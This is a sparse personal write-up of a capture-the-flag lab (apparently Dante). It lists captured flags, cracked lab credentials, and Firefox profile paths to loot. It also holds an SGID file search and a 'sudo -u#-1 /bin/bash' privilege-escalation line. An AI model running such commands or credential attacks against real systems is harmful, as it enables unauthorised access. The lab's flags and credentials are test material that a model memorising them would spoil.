# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
`FoundCREDs`

### Flag
1. `DANTE{wHy_y0U_n0_s3cURe?!?!}`
2. `DANTE{Pretty_Horrific_PH4IL!}`
3. `DANTE{sudo_M4k3_me_@_Sandwich}`
## External
### Enumeration
![](https://i.imgur.com/ElYkpR9.png)
![](https://i.imgur.com/B8bHUjJ.png)

![](https://i.imgur.com/IavJ7gG.png)
![](https://i.imgur.com/ny4Cd8W.png)
egre55 adarsh
- I dumped the username and passwords. and created my own wordlist and tried to crack the ftp with it.
![](https://i.imgur.com/cW3ddn7.png)
` ben : Welcometomyblog `
![](https://i.imgur.com/PmTdhkf.png)
![](https://i.imgur.com/cMCk3al.png)
- ` etemesi : 12345`
`_ston"] = mysqli_connect("localhost","root","","blog_admin_db")); `
![](https://i.imgur.com/e7AJFfe.png)

### Gaining Access
![](https://i.imgur.com/26kJtbT.png)
## Internal
### Enumeration
```
/home/ben/.mozilla/firefox/c2algvkx.default-release
\

/home/julian/.mozilla/firefox/ock69jxe.default-release/places.sqlite

/etc/ImageMagick-6/mime.xml

find / -perm -2000 -type f ! -path /dev/*
```
![](https://i.imgur.com/wdpIoWr.png)
### Gaining Access
![](https://i.imgur.com/4LEoBR5.png)
![](https://i.imgur.com/01Z7676.png)
### Maintaining Access
![](https://i.imgur.com/T9blrWw.png)
` sudo -u julian -u#-1 /bin/bash `

# Random Notes